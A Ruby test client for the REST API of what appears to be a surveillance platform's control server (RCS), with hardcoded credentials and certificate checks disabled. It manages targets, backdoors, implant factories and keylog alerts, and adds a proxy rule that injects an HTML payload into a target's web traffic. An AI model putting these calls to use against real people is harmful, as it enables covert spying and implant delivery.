require 'net/http'
require 'json'
require 'benchmark'
require 'open-uri'
require 'pp'

#http = Net::HTTP.new('192.168.1.189', 4444)
http = Net::HTTP.new('localhost', 4444)
http.use_ssl = true
http.verify_mode = OpenSSL::SSL::VERIFY_NONE

# login
account = {
  :user => 'alor', 
  :pass => 'demorcss'
  }
resp = http.request_post('/auth/login', account.to_json, nil)
puts "auth.login"
puts resp.body
cookie = resp['Set-Cookie'] unless resp['Set-Cookie'].nil?
puts "cookie " + cookie
puts

# session
if false
  # session.index
  res = http.request_get('/session', {'Cookie' => cookie})
  puts "session.index"
  puts res
  puts
  
  sess = JSON.parse(res.body)[0]
  
  # session.destroy
  res = http.delete("/session/#{sess['cookie']}", {'Cookie' => cookie})
  puts "session.destroy"
  puts res
  puts
end

# user
if false 
# user.create
# {'name': 'admin', 'pass': '6104a8be02be972bedf8c8bf107370fc517e2606', 'desc': 'Deus Ex Machina', 'contact': '', 'privs': ['ADMIN', 'TECH', 'VIEW'], 'enabled': true, 'locale': 'en_US', 'timezone': 0, 'group_ids':[]}
user = {'name' => 'testina', 'pass' => 'test', 'desc' => 'Deus Ex Machina', 'contact' => '', 'privs' => ['ADMIN', 'TECH', 'VIEW'], 'enabled' => true, 'locale' => 'en_US', 'timezone' => 0}
res = http.request_post('/user', user.to_json, {'Cookie' => cookie}) 
puts "user.create "
puts res
puts

exit unless res.kind_of? Net::HTTPOK

test_user = JSON.parse(res.body)

#user.index
res = http.request_get('/user', {'Cookie' => cookie})
puts "user.index"
puts res
puts

# user.update
user = {'desc' => 'Fallen angel', 'contact' => 'billg@microsoft.com', 'not_exist' => 'invalid field'}
res = http.request_put("/user/#{test_user['_id']}", user.to_json, {'Cookie' => cookie}) 
puts "user.update "
puts res
puts

#user.show
res = http.request_get("/user/#{test_user['_id']}", {'Cookie' => cookie})
puts "user.show"
puts res
puts

# user.destroy
#res = http.delete("/user/#{test_user['_id']}", {'Cookie' => cookie}) 
#puts "user.delete "
#puts res
#puts

end

# group
if false
# group.create
group = {'name' => 'test'}
res = http.request_post('/group', group.to_json, {'Cookie' => cookie}) 
puts "group.create "
puts res
puts

exit unless res.kind_of? Net::HTTPOK

test_group = JSON.parse(res.body)

# group.index
res = http.request_get('/group', {'Cookie' => cookie})
puts "group.index"
puts res
puts

# group.alert
group = {'name' => 'test container'}
res = http.request_post("/group/alert", test_group['_id'].to_json, {'Cookie' => cookie}) 
puts "group.alert "
puts res
puts

# group.update
group = {'name' => 'test container'}
res = http.request_put("/group/#{test_group['_id']}", group.to_json, {'Cookie' => cookie}) 
puts "group.update "
puts res
puts

# get the first user
res = http.request_get('/user', {'Cookie' => cookie})
test_user = JSON.parse(res.body)[0]

# group.add_user
group_user = {user: {_id: test_user['_id']}}
res = http.request_post("/group/add_user/#{test_group['_id']}", group_user.to_json, {'Cookie' => cookie}) 
puts "group.add_user "
puts res
puts

# get the first user
res = http.request_get('/user', {'Cookie' => cookie})
test_user = JSON.parse(res.body)[0]
puts "relation inside user?"
puts test_user.inspect
puts

# group.show
res = http.request_get("/group/#{test_group['_id']}", {'Cookie' => cookie})
puts "group.show"
puts res
puts

# group.del_user
group_user = {user: {_id: test_user['_id']}}
res = http.request_post("/group/del_user/#{test_group['_id']}", group_user.to_json, {'Cookie' => cookie}) 
puts "group.del_user "
puts res
puts

# group.show
res = http.request_get("/group/#{test_group['_id']}", {'Cookie' => cookie})
puts "group.show"
puts res
puts

# get the first user
res = http.request_get('/user', {'Cookie' => cookie})
test_user = JSON.parse(res.body)[0]
puts "Is the user still there?"
puts test_user.inspect
puts

# group.destroy
res = http.delete("/group/#{test_group['_id']}", {'Cookie' => cookie}) 
puts "group.delete "
puts res
puts

# get the first user
res = http.request_get('/user', {'Cookie' => cookie})
test_user = JSON.parse(res.body)[0]
puts "Is the user still there?"
puts test_user.inspect
puts

end

# audit
if false
  # audit.count
    res = http.request_get('/audit/filters', {'Cookie' => cookie})
    puts "audit.filters"
    puts res.body
    puts
  
   res = http.request_get('/audit/count', {'Cookie' => cookie})
   puts "audit.count"
   puts res.body.inspect
   puts
   
   res = http.request_get(URI.escape('/audit/count?filter={"action": ["puddu"]}'), {'Cookie' => cookie})
   puts "audit.count 'puddu'"
   puts res.body.inspect
   puts
   
   res = http.request_get(URI.escape('/audit/count?filter={"action": ["user.update", "login"]}'), {'Cookie' => cookie})
   puts "audit.count 'user.update'"
   puts res.body.inspect
   puts
   
  # audit.index
   res = http.request_get(URI.escape('/audit?filter={"action": ["user.update"]}&startIndex=0&numItems=10'), {'Cookie' => cookie})
   puts "audit.index 'user.update'"
   puts res
   puts
   
   # audit.index
  res = http.request_get('/audit', {'Cookie' => cookie})
  puts "audit.index"
  puts res
  puts
end

# audit export log
if false
  params = {'file_name' => 'pippo', 'filter' => {"action" => ["user.update", "login"]} }
  res = http.request_post("/audit/create", params.to_json, {'Cookie' => cookie})
  puts "audit.export"
  File.open('pippo.csv', 'wb') do |f|
    f.write res.body
  end
  puts
end

# license
if false
  # license.limit
  res = http.request_get('/license/limit', {'Cookie' => cookie})
  puts "license.limit"
  puts res
  puts
  
  # license.count
  res = http.request_get('/license/count', {'Cookie' => cookie})
  puts "license.count"
  puts res
  puts
end

# monitor
if false
  # status.index
  res = http.request_get('/status', {'Cookie' => cookie})
  puts "status.index"
  puts res
  puts
  
  #monitor = JSON.parse(res.body)[0]
  
  #res = http.delete("/status/#{monitor['_id']}", {'Cookie' => cookie})
  #puts "status.destroy"
  #puts res
  #puts

  res = http.request_get('/status/counters', {'Cookie' => cookie})
  puts "status.counters"
  puts res
  puts
end

# task
if false

def REST_task(http, cookie, type, filename, params={})
  
  res = http.request_get('/task', {'Cookie' => cookie})
  puts "task.index"
  puts res.body
  puts
  
  task_params = {'type' => type, 'file_name' => filename}
  task_params.merge! params
  
  res = http.request_post('/task/create', task_params.to_json, {'Cookie' => cookie})
  puts "task.create"
  puts res.body
  task = JSON.parse(res.body)
  puts "Created task #{task['_id']}"
  puts
  
  resource = ''
  while (resource == '')
    res = http.request_get("/task/#{task['_id']}", {'Cookie' => cookie})
    puts "task.show"
    puts res.body
    task = JSON.parse(res.body)
    puts "#{task['current']}/#{task['total']} #{task['desc']}"
    resource = task['resource']
    file_name = task['file_name']
    sleep 0.1
  end
  
  puts "resource: #{resource.to_s}"
  res = http.request_get("/#{resource['type']}/#{resource['_id']}", {'Cookie' => cookie})
  puts "#{resource['type']}.get"
  File.open(file_name, 'wb') do |f|
    f.write res.body
  end
  
  puts "Written #{file_name}."
  
  res = http.request_get('/task', {'Cookie' => cookie})
  puts "task.index"
  puts res.body
  puts
  
  res = http.request_post('/task/destroy', task['_id'].to_json, {'Cookie' => cookie})
  puts "task.destroy"
  puts res.inspect
  puts
end

REST_task(http, cookie, 'audit', 'audit-all.tar.gz')
REST_task(http, cookie, 'dummy', 'dummy.tar.gz')

=begin
sleep 3

res = http.delete("/task/#{task['id']}", {'Cookie' => cookie})
puts "task.delete"
puts res
puts
=end

end # task

# grid
if false
=begin
  grid_id = '4dfa1d1aa4df496c90fab43e' # 1.4 gb (underground.avi)
  #grid_id = '4dfa2483674bba48cd2a153f' # 280 mb (en_outlook.exe)
  fo = File.open('underground.avi', 'wb')
  puts "grid.show"
  total = 0
  http.request_get("/grid/#{grid_id}", {'Cookie' => cookie}) do |resp|
    resp.read_body do |segment|
      print "."
      total += segment.bytesize
      fo.write(segment)
    end
  end
  fo.close
  puts "Got #{total} bytes."
=end

  fo = File.open('dropall.js', 'rb') do |f|
    ret = http.request_post("/grid", f.read ,{'Cookie' => cookie})
    puts ret
  end
end

# proxy
if false
  
  proxy_id = 0
  
  # proxy.index
  res = http.request_get('/proxy', {'Cookie' => cookie})
  puts "proxy.index"
  puts res.body
  puts
  
  proxies = JSON.parse(res.body)
  proxies.each do |proxy|
    if proxy['_mid'] == 3
      proxy_id = proxy['_id']
    end
  #  puts proxy
  #  puts
  end
  
  # proxy.delete
  #proxies.each do |proxy|
  #  puts "proxy.delete"
  #  ret = http.delete("/proxy/#{proxy['_id']}", {'Cookie' => cookie})
  #  puts ret
  #end
  
  # proxy.create
  proxy = {name: 'test'}
  res = http.request_post('/proxy', proxy.to_json, {'Cookie' => cookie})
  puts "proxy.create"
  puts res
  puts
  
  test_proxy = JSON.parse(res.body)
  
  # proxy.update
  proxy = {name: 'IPA', address: '1.2.3.4', redirect: '4.3.2.1', desc: 'test injection proxy', port: 4445, poll: true}
  res = http.request_put("/proxy/#{test_proxy['_id']}", proxy.to_json, {'Cookie' => cookie}) 
  puts "proxy.update "
  puts res
  puts
  
  # proxy.show
  res = http.request_get("/proxy/#{proxy_id}", {'Cookie' => cookie})
  puts "proxy.show"
  puts res.body
  #proxy = JSON.parse(res.body)
  #puts proxy.inspect
  puts
  
  # proxy.rules
  puts "proxy.rules"
  puts proxy['rules'].inspect
  puts
  
  # proxy.log
  res = http.request_get("/proxy/log/#{proxy_id}", {'Cookie' => cookie})
  puts "proxy.log"
  puts res
  puts
  
  # proxy.add_rule
  puts "proxy.add_rule"
  rule = {rule: {enabled: true, disable_sync: false, ident: 'STATIC-IP', 
          ident_param: '14.11.78.4', probability: 100, resource: 'www.alor.it', 
          action: 'INJECT-HTML', action_param: 'RCS_0000602', target_id: '4e033ae62afb65e061000056'}}
  res = http.request_post("/proxy/add_rule/#{proxy_id}", rule.to_json, {'Cookie' => cookie})

  rule = JSON.parse(res.body)
  #puts rule
  puts
  
  # proxy.rules
  puts "proxy.show"
  res = http.request_get("/proxy/#{proxy_id}", {'Cookie' => cookie})
  puts res.body
  proxy = JSON.parse(res.body)
  #puts proxy['rules'].inspect
  puts
  
  # proxy.update_rule
  puts "proxy.update_rule"
  mod = {rule: {_id: rule['_id'], enabled: false, disable_sync: true, ident: 'STATIC-MAC',
          ident_param: '00:11:22:33:44:55', target_id: '4e033ae62afb65e061000056'}}
  res = http.request_post("/proxy/update_rule/#{proxy_id}", mod.to_json, {'Cookie' => cookie})
  puts res
  puts
  
  # proxy.rules
  puts "proxy.show"
  res = http.request_get("/proxy/#{proxy_id}", {'Cookie' => cookie})
  puts res.body
  #proxy = JSON.parse(res.body)
  #puts proxy['rules'].inspect
  puts
  
  # proxy.del_rule
  puts "proxy.del_rule"
  request = {rule: {_id: rule['_id']}}
  res = http.request_post("/proxy/del_rule/#{proxy_id}", request.to_json, {'Cookie' => cookie})
  puts res
  puts
  
  # proxy.config
  puts "proxy.config"
  res = http.request_get("/proxy/config/#{proxy_id}", {'Cookie' => cookie})
  puts res
  puts

end

# collector
if false
  # collector.index
  res = http.request_get('/collector', {'Cookie' => cookie})
  puts "collector.index"
  puts res.body
=begin  
  collectors = JSON.parse(res.body)
  collectors.each do |coll|
    puts coll
    puts
  end
  
  # collector.delete
  collectors.each do |coll|
    puts "collector.delete"
    ret = http.delete("/collector/#{coll['_id']}", {'Cookie' => cookie})
    puts ret
  end
=end  
  # collector.create
  coll = {name: 'test'}
  res = http.request_post('/collector', coll.to_json, {'Cookie' => cookie})
  puts "collector.create"
  puts res
  puts
  
  test_coll = JSON.parse(res.body)
  
  # collector.update
  coll = {name: 'anonymizer', address: '1.2.3.4', desc: 'test collector', port: 4445, poll: true}
  res = http.request_put("/collector/#{test_coll['_id']}", coll.to_json, {'Cookie' => cookie}) 
  puts "collector.update "
  puts res
  puts
  
end

# alerts
if false
  # alert.index
  puts "alert.index" 
  res = http.request_get('/alert', {'Cookie' => cookie})
  puts res
  puts
  
  # alert.create
  puts "alert.create" 
  alert = {evidence: 'keylog', priority: 5, suppression: 600, type: 'mail', keywords: 'ciao miao bau', path: [1, 2, 3]}
  res = http.request_post('/alert', alert.to_json, {'Cookie' => cookie})
  alert = JSON.parse(res.body)
  puts alert
  puts

  # alert.index
  puts "alert.index" 
  res = http.request_get('/alert', {'Cookie' => cookie})
  puts res
  puts

  # alert.update
  puts "alert.update" 
  mod = {evidence: 'chat', priority: 1, enabled: false}
  res = http.request_put("/alert/#{alert['_id']}", mod.to_json, {'Cookie' => cookie})
  puts res
  puts

  # alert.show
  puts "alert.show" 
  res = http.request_get("/alert/#{alert['_id']}", {'Cookie' => cookie})
  puts res
  puts
  
  # alert.index
  puts "alert.index" 
  res = http.request_get('/alert', {'Cookie' => cookie})
  puts res
  puts
  
  # alert.delete
  puts "alert.delete"
  res = http.delete("/alert/#{alert['_id']}", {'Cookie' => cookie})
  puts res
  puts
  
  # alert.index
  puts "alert.index" 
  res = http.request_get('/alert', {'Cookie' => cookie})
  puts res
  puts
  
  # alert.counter
  puts "alert.counter" 
  res = http.request_get('/alert/counters', {'Cookie' => cookie})
  puts res
  puts
  
end

# operations
if false
  puts "operation.index" 
  res = http.request_get('/operation', {'Cookie' => cookie})
  puts res.body
  operations = JSON.parse(res.body)
  puts operations
  puts
  
  puts "operation.show"
  res = http.request_get("/operation/#{operations.first['_id']}", {'Cookie' => cookie})
  operation = JSON.parse(res.body)
  puts operation
  
  puts "operation.create"
  operation_post = {
    name: "test operation", 
    desc: "this is a test operation", 
    contact: "billg@microsoft.com"
  }
  res = http.request_post("/operation/create", operation_post.to_json, {'Cookie' => cookie})
  puts res.body
  operation = JSON.parse(res.body)
  puts operation
  puts
  
  puts "operation.update"
  operation_post = {
    _id: operation['_id'],
    name: "RENAMED!!!", 
    desc: "whoa! this is our renamed operation", 
    contact: "ballmer@microsoft.com"
  }
  res = http.request_post("/operation/update", operation_post.to_json, {'Cookie' => cookie})
  puts res.body
  operation = JSON.parse(res.body)
  puts operation
  puts
  
  puts "operation.delete"
  res = http.request_post("/operation/destroy", {_id: operation['_id']}.to_json, {'Cookie' => cookie})
  puts res.body
  puts
end

# targets
if false
  res = http.request_get('/operation', {'Cookie' => cookie})
  operations = JSON.parse(res.body)

  puts "target.index" 
  res = http.request_get('/target', {'Cookie' => cookie})
  puts res.body
  targets = JSON.parse(res.body)
  puts targets  
  puts

  puts "target.show"
  res = http.request_get("/target/#{targets.first['_id']}", {'Cookie' => cookie})
  puts res.body
  target = JSON.parse(res.body)
  #puts target
  puts
  
  puts "target.create"
  target_post = {
    name: "test target", 
    desc: "this is a test target",
    operation: operations.first['_id']
  }
  res = http.request_post("/target/create", target_post.to_json, {'Cookie' => cookie})
  puts res.body
  target = JSON.parse(res.body)
  #puts target
  puts
  
  puts "target.update"
  target_post = {
    _id: target['_id'],
    name: "RENAMED!!!", 
    desc: "whoa! this is our renamed target", 
    contact: "ballmer@microsoft.com"
  }
  res = http.request_post("/target/update", target_post.to_json, {'Cookie' => cookie})
  puts res.body
  target = JSON.parse(res.body)
  #puts target
  puts
  
  puts "target.delete"
  res = http.request_post("/target/destroy", {_id: target['_id']}.to_json, {'Cookie' => cookie})
  puts res.body
  puts
end

# backdoors
if false
  res = http.request_get('/operation', {'Cookie' => cookie})
  operations = JSON.parse(res.body)
  
  res = http.request_get('/target', {'Cookie' => cookie})
  targets = JSON.parse(res.body)
  
  puts "backdoor.index"
  res = http.request_get('/backdoor', {'Cookie' => cookie})
  puts res.body
  backdoors = JSON.parse(res.body)
  puts "You got #{backdoors.size} backdoors."
  puts
  
  puts "backdoor.show"
  res = http.request_get("/backdoor/#{backdoors.first['_id']}", {'Cookie' => cookie})
  puts res.body
  backdoor = JSON.parse(res.body)
  puts backdoor
  puts
  
  puts "backdoor.update"
  backdoor_post = {
     _id: backdoor['_id'],
     name: "RENAMED!!!", 
     desc: "whoa! this is our renamed backdoor", 
     ident: "this field MUST NOT be updated!!!!!!!!!!!!"
   }
  res = http.request_post("/backdoor/update", backdoor_post.to_json, {'Cookie' => cookie})
  puts res.body
  backdoor = JSON.parse(res.body)
  puts backdoor
  puts
   
  puts "backdoor.delete"
  res = http.request_post("/backdoor/destroy", {_id: backdoor['_id']}.to_json, {'Cookie' => cookie})
  puts res.body
  puts
end

# factories
if false
  res = http.request_get('/operation', {'Cookie' => cookie})
  operations = JSON.parse(res.body)
  
  res = http.request_get('/target', {'Cookie' => cookie})
  targets = JSON.parse(res.body)
  
  puts "factory.index"
  res = http.request_get('/factory', {'Cookie' => cookie})
  puts res.body
  factories = JSON.parse(res.body)
  puts "You got #{factories.size} factories."
  puts
  
  puts "factory.show"
  res = http.request_get("/factory/#{factories.first['_id']}", {'Cookie' => cookie})
  puts res.body
  factory = JSON.parse(res.body)
  puts

  puts "factory.create"
  factory_post = {
     name: "Uber Factory!",
     desc: "The best factory in the World!",
     operation: targets.first['path'].first,
     target: targets.first['_id']
   }
  res = http.request_post("/factory/create", factory_post.to_json, {'Cookie' => cookie})
  puts res.body
  factory = JSON.parse(res.body)
  puts
  
  puts "factory.update"
  backdoor_post = {
     _id: factory['_id'],
     name: "RENAMED!!!", 
     desc: "whoa! this is our renamed backdoor", 
     ident: "this field MUST NOT be updated!!!!!!!!!!!!"
   }
  res = http.request_post("/factory/update", backdoor_post.to_json, {'Cookie' => cookie})
  puts res.body
  factory = JSON.parse(res.body)
  puts factory
  puts
  
  puts "factory.delete"
  res = http.request_post("/factory/destroy", {_id: factory['_id']}.to_json, {'Cookie' => cookie})
  puts res.body
  puts
end

# items
if false
  # item.index
  puts "item.index" 
  res = http.request_get('/item', {'Cookie' => cookie})
  items = JSON.parse(res.body)
  puts "You've got #{items.size} items."
  puts
  
  # item.index
  puts "item.index RCS_0000000610"
  res = http.request_get(URI.escape('/item?filter={"name": "RCS_0000000610"}'), {'Cookie' => cookie})
  rcs_10 = JSON.parse(res.body)
  puts rcs_10
  puts
end

#upload
if true
  # upload.create
  res = http.request_post('/upload', "abracadabra", {'Cookie' => cookie})
  puts "upload.create"
  puts res
  puts
end

# logout
res = http.request_post('/auth/logout', nil, {'Cookie' => cookie})
puts
puts "auth.logout"
puts res
puts
